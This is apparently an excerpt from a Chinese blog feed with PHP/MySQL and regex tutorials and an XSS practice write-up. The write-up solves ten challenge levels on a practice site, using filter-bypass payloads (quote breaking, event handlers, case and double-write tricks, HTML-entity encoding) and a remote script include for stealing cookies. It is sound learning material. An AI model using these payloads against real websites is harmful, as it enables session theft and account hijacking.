去掉字符串行尾和行头的空格<br>SUBSTRING(str,x,y)    返回从字符串str x位置起y个字符长度的字符串<br>LENGTH(str)            返回字符串长度<br><strong>2.数值函数</strong><br>ABS(x)                返回x的绝对值<br>CEIL(x)                返回大于x的最小整数值<br>FLOOR(x)                返回小于x的最大整数值<br>MOD(x,y)                返回x/y的模<br>RAND()                返回0-1内的随机值<br>ROUND(x,y)            返回参数x的四舍五入的有y位小数的值<br>TRUNCATE(x,y)            返回数字x截断为y位小数的结果<br><strong>3.日期和时间函数</strong><br>CURDATE()        返回当前日期<br>CURTIME()        返回当前时间<br>NOW()            返回当前的日期和时间<br>UNIX_TIMESTAMP(date)    返回日期date的UNIX时间戳<br>FROM_UNIXTIME()        返回UNIX时间戳的日期值<br>WEEK(date)        返回日期date为一年中的第几周<br>YEAR(date)        返回日期date的年份<br>HOUR(time)        返回time的小时值<br>MINUTE(time)        返回time的分钟值<br>MONTHNAME(date)        返回date的月份名<br>DATE_FORMAT(date,fmt)    返回按字符串fmt格式化日期date值<br>DATE_ADD(add,INTERVAL expr type) 返回一个日期或时间值加上一个时间间隔的时间值<br>DATEDIFF(expr,expr2)    返回起始时间expr和结束时间expr2之间的天数<br><strong>4.流程函数</strong><br>1)IF(value,t,f)        如果value是真，返回t,否则返回f<br>    select if(field1&gt;1000,’高薪’,’低薪’);<br>2)IFNULL(value1,value2)    如果value1不为null，返回value1，否则value1该是什么还是什么<br>    select ifnull(name,’无名’);<br>3)CASE WHEN [value1] THEN [result1]…ELSE[default]END    如果value1是真，返回result1，否则返回default<br>    select case when 100&gt;10 then ‘真’ else ‘假’ end;<br>    和if语句比较像<br>4)CASE [expr] WHEN [value1] THEN[result1]…ELSE[default]END  如果expr等于value1，返回result1，否则返回default<br>    select case 1 when 1 then ‘一’ when 2 then ‘二’ when 3 then ‘三’ else ‘未知数字’end;<br>    和switch语句比较像<br><strong>5.其他常用函数</strong></p><p>用法：<code>select 函数名;</code></p><p>DATABASE()        返回当前数据库名<br>VERSION()        返回当前数据库版本<br>USER()            返回当前登录用户名<br>INET_ATON(IP)    返回IP地址的数字表示<br>INET_NTOA(num)    返回数字代表的IP地址<br>PASSWORD(str)    返回字符串str的加密版本<br>MD5()            返回字符串str的MD5值</p><h3 id="六、mysqli与MySQL交互"><a href="#六、mysqli与MySQL交互" class="headerlink" title="六、mysqli与MySQL交互"></a>六、mysqli与MySQL交互</h3><h4 id="1-建立、关闭与MySQL服务器的连接"><a href="#1-建立、关闭与MySQL服务器的连接" class="headerlink" title="1.建立、关闭与MySQL服务器的连接"></a>1.建立、关闭与MySQL服务器的连接</h4><p><strong>1)连接指定的mysql服务器</strong></p><pre><code class="sql">$mysqli_connect=@mysqli_connect($host, $user, $password,$database,$port);//$port端口，默认3306</code></pre><p><strong>2)连接错误时的提示</strong></p><pre><code class="sql">int mysqli_connect_errno ();//返回最后一次连接调用的错误代码string mysqli_connect_error ();//返回一个字符串描述的最后一次连接调用的错误代码</code></pre><p><strong>3)设置默认字符编码</strong></p><pre><code class="sql">bool mysqli_set_charset ( mysqli $link , string $charset )</code></pre><p><strong>4)选择特定的数据库</strong></p><pre><code class="sql">bool mysqli_select_db ( mysqli $link , string $dbname);</code></pre><p><strong>5)关闭与mysql服务器的连接</strong><br>   bool mysqli_close ( mysqli $link );</p><pre><code class="php">&lt;?phpheader(&#39;Content-type:text/html;charset=utf-8&#39;);//与MySQL建立连接$link=@mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;);//连接错误提示if(mysqli_connect_errno()){    exit(mysqli_connect_errno());}//设置默认字符编码mysqli_set_charset($link,&#39;utf8&#39;);//选择数据库mysqli_select_db($link,&#39;myphp&#39;);//关闭与mysql服务器的连接mysqli_close($link);?&gt;</code></pre><h4 id="2-执行SQL语句"><a href="#2-执行SQL语句" class="headerlink" title="2.执行SQL语句"></a>2.执行SQL语句</h4><p><strong>1)对数据库执行一条SQL语句</strong><br>1&gt;</p><pre><code class="sql">mixed mysqli_query ( mysqli $link , string $query [, int $resultmode = MYSQLI_STORE_RESULT ] );</code></pre><p>​    ①对于insert，update，delete等不会返回数据的SQL语句，在执行没有错误时将返回true。<br>​    ②对于返回数据的SQL语句执行成功的时候会返回结果集对象可以使用操作结果集对象的函数来从中获取数据<br>​    ③MYSQLI_STORE_RESULT和MYSQLI_USE_RESULT决定了mysqli client和server之间取结果集的方式。<br>​    MYSQLI_STORE_RESULT：执行SQL时提取结果集返回给client，并分配内存，存储到用户程序空间中,之后mysqli_fetch_array()<br>​    相当于是从本地取数据；而MYSQLI_USE_RESULT方式下，mysqli_fetch_array()每次都要向server请求结果行。<br>​    MYSQLI_USE_RESULT：执行SQL的时候并没有从server将结果集取回<br>2&gt;<code>bool mysqli_real_query ( mysqli $link , string $query );</code><br>​    也可以使用本函数对数据库执行一条SQL语句，返回结果为布尔值，不返回结果集。<br>​    如果想获取结果集可以使用mysqli_store_result()获取结果集对象.<br>3&gt;如果在执行SQL语句的时候发生错误，以上两个函数都将返回false，并且可以使用以下函数处理错误原因<br>​    <code>int mysqli_errno ( mysqli $link );</code><br>​    <code>string mysqli_error ( mysqli $link );</code></p><pre><code class="php">//对数据库执行一条SQL语句//$query=&#39;insert into t1(info) values(&quot;xiaoming&quot;)&#39;;$query=&#39;select*from t1&#39;;$result=mysqli_query($link,$query);</code></pre><p><strong>2)操作结果集对象的函数</strong><br>1&gt;从结果集对象中解析数据的常见函数<br> ①以索引数组的方式获取一条记录的数据<br><code>mixed mysqli_fetch_row ( mysqli_result $result );</code><br>重复使用以获取下一条记录的数据</p><pre><code class="php">//以索引数组的方式获取一条记录的数据while ($data=mysqli_fetch_row($result)){    var_dump($data);}</code></pre><p>②以关联数组的方式获取一条记录的数据<br><code>array mysqli_fetch_assoc ( mysqli_result $result );</code><br>重复使用以获取下一条记录的数据</p><pre><code class="php">//以关联数组的方式获取一条记录的数据var_dump(mysqli_fetch_assoc($result));var_dump(mysqli_fetch_assoc($result));var_dump(mysqli_fetch_assoc($result));var_dump(mysqli_fetch_assoc($result));var_dump(mysqli_fetch_assoc($result));</code></pre><p> ③以索引数组或关联数组的方式获取一条记录的数据<br><code>mixed mysqli_fetch_array ( mysqli_result $result [, int $resulttype = MYSQLI_BOTH ] );</code><br>重复使用以获取下一条记录的数据</p><pre><code class="php">//以索引数组或关联数组的方式获取一条记录的数据//第二个参数可选值：MYSQLI_ASSOC, MYSQLI_NUM, MYSQLI_BOTH(默认)var_dump(mysqli_fetch_array($result,MYSQLI_NUM));</code></pre><p>④以索引数组或关联数组的方式获取全部记录的数据<br><code>mixed mysqli_fetch_all ( mysqli_result $result [, int $resulttype = MYSQLI_NUM ] );</code></p><pre><code class="php">mysqli_fetch_all($result);</code></pre><p>⑤返回结果集中的下一个字段信息<br><code>object mysqli_fetch_field ( mysqli_result $result );</code></p><pre><code class="php">//返回结果集中的下一个字段信息$filed=mysqli_fetch_field($result);var_dump($filed);echo $filed-&gt;orgname;//重复使用获取下一个字段var_dump(mysqli_fetch_field($result));var_dump(mysqli_fetch_field($result));</code></pre><p>⑥返回一个代表结果集字段的对象数组<br><code>array mysqli_fetch_fields ( mysqli_result $result );</code></p><pre><code class="php">//返回一个代表结果集字段的对象数组var_dump(mysqli_fetch_fields($result));$fields=mysqli_fetch_fields($result);echo $fields[0]-&gt;name;</code></pre><p>⑦获取结果中行的数量<br><code>int mysqli_num_rows ( mysqli_result $result );</code></p><pre><code class="php">//获取结果中行的数量var_dump(mysqli_num_rows($result));</code></pre><p>注意：如果使用MYSQLI_USE_RESULT模式则必须在获取完所有的结果才可使用该函数。<br>2&gt;释放与一个结果集相关的内存<br>返回的结果集在数据量很大的时候需要很多的内存支持，所以在操作完结果集的时候有必要立刻释放与一个结果集相关的内存， 释放之后，结果集就不可用了<br><code>void mysqli_free_result ( mysqli_result $result );</code></p><pre><code class="php">//释放与一个结果集相关的内存mysqli_free_result($result);</code></pre><p><strong>3)其他常用函数</strong><br>1&gt;获取前一个Mysql操作的受影响行数<br>    <code>int mysqli_affected_rows ( mysqli $link );</code><br>2&gt;返回最后一次操作自动生成并使用的id<br>     <code>mixed mysqli_insert_id ( mysqli $link );</code><br>3&gt;转义用于SQL语句中的特殊字符防止SQL语句出错<br>     <code>string mysqli_real_escape_string ( mysqli $link , string $escapestr );</code><br><strong>4)一次性执行多条SQL语句,多个SQL语句用分号隔开</strong><br>    <code>bool mysqli_multi_query ( mysqli $link , string $query );</code></p><h4 id="七、知识补充"><a href="#七、知识补充" class="headerlink" title="七、知识补充"></a>七、知识补充</h4><p><strong>1.include语句</strong></p><p>当一个文件被包含时，其中所包含的代码继承了 include 所在行的变量范围。从该处开始，调用文件在该行处可用的任何变量在被调用的文件中也都可用。 </p><p><strong>2.include_once语句</strong></p><p> 唯一区别是如果该文件已经被包含过，则不会再次包含。可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。</p><p><strong>3.require语句</strong></p><p> require 和 include 几乎完全一样，除了处理失败的方式不同之外。require 在出错时产生致命错误。换句话说将导致脚本终止而 include 只产生警告信息，脚本会继续运行。</p><p><strong>4.require_once语句</strong></p><p> require_once 语句和 require 语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 </p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL学习 </tag>
            
            <tag> PHP与MySQL交互 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞攻关(一)</title>
      <link href="/2019/04/28/XSS%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%85%B3(%E4%B8%80)/"/>
      <url>/2019/04/28/XSS%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%85%B3(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在了解xss之前，可以先了解一下下面这些内容</p><p>1.AJAX实现异步更新、跨域</p><p>2.常用命令<code>document.write();``alert(&quot;&quot;);``document.cookie;</code></p><p>3.payload—意思为有效载荷，概念验证，即是漏洞验证脚本；</p><p><strong><u>Ajax跨域</u></strong></p><p><strong>1.允许单个域名访问</strong></p><p>指定某域名跨域访问，只需在<code>http://xx.com/xx.php</code>文件头部添加如下代码：</p><pre><code class="php">header(&#39;Access-Control-Allow-Origin:http://xx.com&#39;);</code></pre><p><strong>2.允许所有域名访问</strong></p><p>允许所有域名跨域访问，只需在<code>http://xx.com/xx.php</code>文件头部添加如下代码：</p><pre><code class="php">header(&#39;Access-Control-Allow-Origin:*&#39;);</code></pre><p><strong>3.允许多个域名访问</strong></p><p><strong><u>JS获取url</u></strong></p><p><strong><em>获取当前域名</em></strong></p><p><strong>方法一</strong></p><p><code>var domain = document.domain;</code></p><p><strong>方法二</strong></p><p><code>var domain = window.location.host;</code></p><p><strong>注意问题</strong></p><p>　由于获取到的当前域名不包括 http://，所以把获取到的域名赋给 a 标签的 href 时，别忘了加上 http://，否则单击链接时导航会出错。</p><p>其他想了解请看<a href="https://www.cnblogs.com/wangdahai/p/6221399.html" target="_blank" rel="noopener">js获取当前域名、Url、相对路径和参数以及指定参数</a></p><h4 id="Session-amp-Cookie"><a href="#Session-amp-Cookie" class="headerlink" title="Session &amp; Cookie"></a>Session &amp; Cookie</h4><ol><li>cookie 数 据 存 放 在 客 户 的 浏 览 器 上 ， session 数 据 放 在 服 务 器 上 。</li><li>cookie 不 是 很 安 全 ， 别 人 可 以 分 析 存 放 在 本 地 的 COOKIE 并 进 行 COOKIE 欺 骗 。 考 虑 到 安 全 应 当 使 用 session 。</li><li>session 会 在 一 定 时 间 内 保 存 在 服 务 器 上 。 当 访 问 增 多 ， 会 比 较 占 用 你 服 务 器 的 性 能   考 虑 到 减 轻 服 务 器 性 能 方 面 ， 应 当 使 用 COOKIE 。</li><li>单 个 cookie 保 存 的 数 据 不 能 超 过 4K ， 很 多 浏 览 器 都 限 制 一 个 站 点 最 多 保 存 20 个 cookie 。</li></ol><p><strong>最大区别：一个存储在服务器端，一个存储在客户端</strong></p><h3 id="XSS介绍"><a href="#XSS介绍" class="headerlink" title="XSS介绍"></a>XSS介绍</h3><p>XSS攻击全称跨站脚本攻击(Cross Site Scripting)，XSS是一种在Web应用中的计算机安全漏洞，它允许恶意Web用户将代码植入到提供给其他用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。对于跨站脚本攻击，Hacker共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”</p><h3 id="XSS攻击可能产生的危害"><a href="#XSS攻击可能产生的危害" class="headerlink" title="XSS攻击可能产生的危害"></a>XSS攻击可能产生的危害</h3><ol><li>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</li><li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li><li>盗窃企业重要的具有商业价值的资料</li><li>非法转账</li><li>强制发送电子邮件</li><li>网站挂马</li><li>控制受害者机器向其它网站发起攻击</li></ol><h3 id="XSS漏洞的分类"><a href="#XSS漏洞的分类" class="headerlink" title="XSS漏洞的分类"></a>XSS漏洞的分类</h3><h4 id="1-DOM-本地利用-型："><a href="#1-DOM-本地利用-型：" class="headerlink" title="1.DOM(本地利用)型："></a>1.DOM(本地利用)型：</h4><p><em>不经过服务器，通过修改页面的DOM节点形成的XSS</em></p><p> 这种漏洞存在于页面中客户端脚本自身</p><p><strong>攻击过程：</strong> </p><p>​     H给U发送一个恶意构造了Web的URL，U点击并查看了这个URL。恶意页面中的JavaScript打开一个具有漏洞的HTML页面并将其安装在U电脑上。具有漏洞的HTML页面包含了在U电脑本地域执行的JavaScript。H的恶意脚本可以在U的电脑上执行U所持有的权限下的命令。</p><h4 id="2-存储型："><a href="#2-存储型：" class="headerlink" title="2.存储型："></a>2.存储型：</h4><p><em>经过服务器，存进数据库</em></p><p>​      该类型是应用最为广泛而且有可能影响到Web服务器自身安全的漏洞，骇客将攻击脚本上传到Web服务器上，使得所有访问该页面的用户都面临信息泄漏的可能，其中也包括了Web服务器的管理员。</p><p><strong>攻击过程：</strong> </p><p>​     A拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。  H注意到A的站点具有存储式XXS漏洞，   H发布一个热点信息，吸引其它用户纷纷阅读。 A或者是任何的其他人U浏览该信息，其会话cookies或者其它信息将被H盗走。  </p><h4 id="3-反射型："><a href="#3-反射型：" class="headerlink" title="3.反射型："></a>3.反射型：</h4><p><em>只是简单地把用户输入的数据反射给浏览器，简单来说，黑客往往需要用户诱使用户点击一个恶意链接，才能攻击成功</em></p><p>又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。类似存储式漏洞，不同的是Web客户端使用Server端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经HTML实体编码，客户端代码便能注入到动态页面中。</p><p><strong>攻击过程：</strong> </p><p>​     U经常浏览某个网站A。U使用用户名/密码进行登录，并存储敏感信息(比如银行帐户信息)在网站A中。 H发现A站点包含反射性的XSS漏洞，编写一利用漏洞的URL，并将其冒充为来自A的邮件给U。 U在登录到A的站点后，浏览H供的URL。嵌入到URL中的恶意脚本在U的浏览器中执行，然后在U完全不知情的情况下将这些信息发送到H的Web站点。</p><h5 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h5><pre><code class="php">header(&quot;X-XSS-Protection:0&quot;);//告诉服务器禁用XSS保护header(&quot;X-XSS-Protection:1&quot;);//告诉服务器开启XSS保护</code></pre><h4 id="实例应用："><a href="#实例应用：" class="headerlink" title="实例应用："></a>实例应用：</h4><ul><li><strong>劫持访问</strong></li></ul><p>劫持访问就是在恶意脚本中插入诸如<code>&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt;</code>的代码，那么页面就会跳转到百度首页。劫持访问在持久型和非持久型XSS中都比较常被利用。持久型XSS中劫持访问的危害不用说大家都清楚，但有人会问非持久型XSS中劫持访问有什么作用呢？很简单，试想下像qq.com，baidu.com这样的域名下出现非持久型XSS，那么在发送钓鱼链接时就可以通过qq.com等域名进行跳转，一般人一看到qq.com之类的域名警惕性会下降，也就更容易上当了。</p><ul><li><strong>盗用cookie实现无密码登录</strong></li></ul><p>由于盗取的cookie需要传回给攻击者，因此往往需要一个服务器来接收盗取的cookie，这也就是xss平台的作用了。网上的xss平台很多，但动手搭建一个也不难，建议有条件的自己搭建。</p><p>首先登录平台后台获取到js脚本地址为<a href="http://127.0.0.1/XSS/template/default.js，所以我们需要做的是把这段代码植入指定页面。" target="_blank" rel="noopener">http://127.0.0.1/XSS/template/default.js，所以我们需要做的是把这段代码植入指定页面。</a></p><pre><code class="html">&lt;script type=&quot;text/javascript&quot; src=&quot;http://127.0.0.1/XSS/template/default.js&quot;&gt;&lt;/script&gt;</code></pre><p>了解的差不多了，下面我开始去在线平台练习了。。。</p><h3 id="XSS攻击常见利用方式"><a href="#XSS攻击常见利用方式" class="headerlink" title="XSS攻击常见利用方式"></a>XSS攻击常见利用方式</h3><p>​    <strong>一般思路：</strong>普通注入<strong>–&gt;</strong>普通闭合注入(带<code>&lt;input&gt;</code>标签)<strong>–&gt;</strong>触发事件注入(特殊字符被过滤)<strong>–&gt;</strong>双关键字、大小写和超链接注入(触发事件的关键字被过滤)<strong>–&gt;</strong>HTML实体编码绕过<strong>–&gt;</strong>HTTP头流量包注入</p><p>下面都是我在在线平台上的练习。做题之后发现查看源码大法真的好。。。。</p><h4 id="1-普通的GET型XSS"><a href="#1-普通的GET型XSS" class="headerlink" title="1.普通的GET型XSS"></a>1.普通的GET型XSS</h4><p><strong>Level1</strong></p><p>页面没有输入点，所以<strong>直接构造</strong>payload就行啦</p><p><code>http://test.xss.tv/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</code>&amp;submit=submit</p><p>该注入能产生说明程序员没有过滤或用引号包裹任何参数内容，也就是说后台代码直接解析执行参数值。这就造成在弱类型的语言中，原本是正常的字符串被当作代码执行，形成该XSS漏洞</p><h4 id="2-带-lt-input-gt-标签的GET型XSS"><a href="#2-带-lt-input-gt-标签的GET型XSS" class="headerlink" title="2.带&lt;input&gt;标签的GET型XSS"></a>2.带<code>&lt;input&gt;</code>标签的GET型XSS</h4><p><strong>Level2</strong><br><img src="http://img-blog.csdnimg.cn/20190716173114646.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源码，发现</p><p><img src="http://img-blog.csdnimg.cn/2019071617313612.jpg" alt="在这里插入图片描述"></p><p>所以直接用<strong>双引号闭合</strong>value，然后构造payload</p><p><code>http://test.xss.tv/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>&amp;submit=submit</p><p>选择在URL处直接注入代码，带<code>&lt;input&gt;</code>标签的GET型XSS和普通的GET型XSS最大的区别就是普通的GET型XSS的参数可以直接被解析，而带<code>&lt;input&gt;</code>标签的GET型XSS还需要闭合原本的<code>input窗口</code>，然后才能注入ShellCode</p><h4 id="3-过滤特殊字符的GET型XSS"><a href="#3-过滤特殊字符的GET型XSS" class="headerlink" title="3.过滤特殊字符的GET型XSS"></a>3.过滤特殊字符的GET型XSS</h4><p><strong>Level3</strong></p><p>原先给的url是</p><pre><code>http://test.xss.tv/level3.php?writing=wait</code></pre><p>而查看源码发现</p><p><img src="http://img-blog.csdnimg.cn/20190716173148993.jpg" alt="在这里插入图片描述"></p><p>value里并没有属性值，因为表单提交里并没有name为writing的，所以把writing改为keyword。闭合value进行普通注入 </p><p><img src="http://img-blog.csdnimg.cn/20190716173200180.jpg" alt="在这里插入图片描述"></p><p>发现过滤了尖括号 ，所以带有尖括号的ShellCode不能用了。所以在此换思路采用触发事件属性：</p><pre><code>http://test.xss.tv/level3.php?keyword=&#39;onclick=&#39;javascript:alert(1)&#39;&amp;submit=submit</code></pre><p><strong>注意：</strong>上面用的是<strong><code>onclick</code>点击事件</strong>，所以还要点击一下输入框才会有弹窗</p><p><strong>Level4</strong></p><p>这道题和Level3的做法相同，查看源码发现，把单引号闭合value换成双引号闭合value就ok啦！</p><pre><code>http://test.xss.tv/level3.php?keyword=&quot;onclick=&quot;javascript:alert(1)&quot;&amp;submit=submit</code></pre><h4 id="4-过滤关键字的GET型XSS"><a href="#4-过滤关键字的GET型XSS" class="headerlink" title="4.过滤关键字的GET型XSS"></a>4.过滤关键字的GET型XSS</h4><p>当特殊字符都被过滤了，再考虑触发事件，触发事件的关键字也被过滤了，就要找哪些还没有被过滤</p><p><strong>Level5</strong></p><p>先使用触发事件测试一下</p><pre><code class="php">http://test.xss.tv/level5.php?keyword=&quot;onclick=&quot;javascript:alert(1)&quot;</code></pre><p>然后查看源代码</p><pre><code class="html">&lt;form action=level5.php method=GET&gt;&lt;input name=keyword  value=&quot;&quot;o_nclick=&quot;javascript:alert(1)&quot;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;</code></pre><p>发现<code>onclick</code>关键字中间被加了下划线。然后我选择使用双关键字和大小写进行绕过，结果没有成功。显然，这种是用<strong>双关键字和大小写</strong>绕过不了的。然后，我考虑了一下<strong>超链接</strong></p><pre><code class="php">http://test.xss.tv/level5.php?keyword=&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code></pre><p>或者</p><pre><code class="php">http://test.xss.tv/level5.php?keyword=&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;点一下&lt;/a&gt;//</code></pre><p><img src="http://img-blog.csdnimg.cn/2019071617322066.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后点击下面的蓝字，就成功了。</p><p><strong>Level6</strong></p><p>我考虑了一下用<strong>超链接</strong>测试</p><pre><code class="php">http://test.xss.tv/level6.php?keyword=&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;点一下&lt;/a&gt;//</code></pre><p>然后查看源代码</p><pre><code class="html">&lt;form action=level6.php method=GET&gt;&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;点一下&lt;/a&gt;//&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;</code></pre><p>发现<code>href</code>关键字中间被加了下划线。然后我再使用<strong>大小写</strong>进行绕过。将<code>e</code>大写</p><pre><code class="php">http://test.xss.tv/level6.php?keyword=&quot;&gt;&lt;a hrEf=&quot;javascript:alert(1)&quot;&gt;点一下&lt;/a&gt;//</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716173234707.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后点击蓝字就成功了。</p><p><strong>Level7</strong></p><p>将Level6的第二步大小写绕过，改为<strong>双写</strong>绕过就行了</p><pre><code class="php">http://test.xss.tv/level7.php?keyword=&quot;&gt;&lt;a hrhrefef=&quot;javascrscriptipt:alert(1)&quot;&gt;点一下&lt;/a&gt;//</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716173246975.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="5-HTML实体编码的GET型XSS"><a href="#5-HTML实体编码的GET型XSS" class="headerlink" title="5.HTML实体编码的GET型XSS"></a>5.HTML实体编码的GET型XSS</h4><p>HTML实体编码指的就是用unicode编码来代替关键字符或关键符号，<code>&amp;</code>、<code>#</code>、<code>;</code>不能被过滤。</p><p><strong>Level8</strong></p><p>首先我尝试在输入框里输入</p><pre><code class="php">javascript:alert(1)</code></pre><p>查看源代码</p><pre><code class="php">&lt;form action=level8.php method=GET&gt;&lt;input name=keyword  value=&quot;javascript:alert(1)&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascr_ipt:alert(1)&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</code></pre><p>发现关键字<code>javascript</code>被加上了下划线</p><p>这里就可以选择用实体编码了，将<code>javascript</code>的<code>t</code>或<code>script</code>进行实体编码<code>javascrip&amp;#116;</code>或</p><pre><code class="html">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;</code></pre><p>然后构造payload</p><pre><code class="php">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</code></pre><p>填入输入框，点击<code>添加友情链接</code>然后再点<code>友情链接</code>，就成功了。</p><p>HTML可以识别，执行文件的正则匹配不会成功，从而达到绕过。编码绕过的方式还有好多种，比如<code>十六进制编码</code>、<code>jsfuck编码</code>、<code>url编码</code>等。</p><p><strong>Level9</strong></p><p>Javascript会被替换为javasc_rpt,尝试用html实体编码绕过，将r编码为<code>&amp;#x72;</code>用Level8的payload试了下，提示链接不合法，必须要有<code>http://</code>关键字</p><p>于是构造payload</p><pre><code class="php">javasc&amp;#x72;ipt:%0dhttp://www.0aa.me%0dalert(1)%0a  %0d都为url编码的换行符    或java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(&amp;#x22;http://&quot;)</code></pre><h4 id="6-转换参数的GET型XSS"><a href="#6-转换参数的GET型XSS" class="headerlink" title="6.转换参数的GET型XSS"></a>6.转换参数的GET型XSS</h4><p><strong>Level10</strong></p><p>keyword注入点，&lt;、&gt;都被过滤，几乎不能突破。查看源码发现有几个type=hidden的输入框 </p><pre><code class="html">&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;</code></pre><p>keyword参数后面输入：</p><pre><code class="php">&amp;t_link=” type=”text” 1&amp;t_history=” type=”text” 2&amp;t_sort =” type=”text” 3</code></pre><p>查看注入点，发现t_sort字段可以注入(也可以一个一个的查找注入点) 。然后构造payload：</p><pre><code class="html">&amp;t_sort=&quot; type=&quot;text&quot;onmouseover=alert`1` &quot;</code></pre><p>或onclick触发事件 </p><pre><code>https://test.xss.tv/level10.php?t_sort=4&quot; onclick=alert(1) type=&quot;text&quot;</code></pre><p>下面的几关好像需要抓包工具进行抓包，我还不怎么会，就暂且先总结这么多吧！后续补上下面的内容。</p><p>未完待续。。。。。。。。。。。。。。。。。。。。。。。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS基础 </tag>
            
            <tag> XSS绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web开发-PHP基础篇(三)</title>
      <link href="/2019/04/27/Web%E5%BC%80%E5%8F%91-PHP%E5%9F%BA%E7%A1%80%E7%AF%87(%E4%B8%89)/"/>
      <url>/2019/04/27/Web%E5%BC%80%E5%8F%91-PHP%E5%9F%BA%E7%A1%80%E7%AF%87(%E4%B8%89)/</url>
      
        <content type="html"><![CDATA[<p>又继续学习了PHP的学习教程，正则表达式、日期与时间、图像处理、文件与目录操作和会话控制。感觉都十分重要，于是在学习中做了认真总结，总结如下</p><h3 id="一、正则表达式"><a href="#一、正则表达式" class="headerlink" title="一、正则表达式"></a>一、正则表达式</h3><p><strong>1、正则表达式语法规则</strong></p><p>​    描述了一类字符串的特征，然后通过这个特征可以配合一些特定的函数，来完成对字符串更加复杂的一系列操作！<br>​    普通字符和特殊字符组成的一个字符串</p><p>如：</p><pre><code class="php">$a=&#39;/test/&#39;;$str=&#39;abctest123456a&#39;;var_dump(preg_match_all($a,$str,$b));//检查$str里是否有$a中的内容(test)，并匹配给$bvar_dump($b);</code></pre><p><strong>2、定界符</strong></p><p>​    我们一般习惯使用正斜线<code>/</code>作为定界的字符。除了字母、数字和反斜线以外的字符都可以作为定界符(# ! {} |)，前后要一致</p><p><strong>3、普通字符</strong></p><p>a-z、A-Z、0-9、双引号、单引号，都没有特殊的含义</p><p><strong>4、元字符</strong></p><p><code>\d</code>    匹配任意一个十进制数字，等价于[0-9]<br><code>\D</code>    匹配任意一个除十进制数字以外字符,等价于[^0-9]<br><code>\s</code>     匹配任意一个空白字符,比如换页符、换行符、回车符、制表符、垂直制表符<br><code>\S</code>    匹配除空白字符以外的任何一个字符<br><code>\w</code>    匹配任意一个数字或字母或下划线<br><code>\W</code>    匹配除数字、字母、下划线以外的任意一个字符<br><code>.</code>       匹配除换行符以外的任意一个字符<br>如：</p><pre><code class="php">$a=&#39;/te.st/&#39;;//单纯只用&quot;.&quot;,需要用反斜线“\”转义$str=&#39;abcte3st123456a&#39;;var_dump(preg_match_all($a,$str,$b));var_dump($b);//输出1</code></pre><pre><code class="php">*    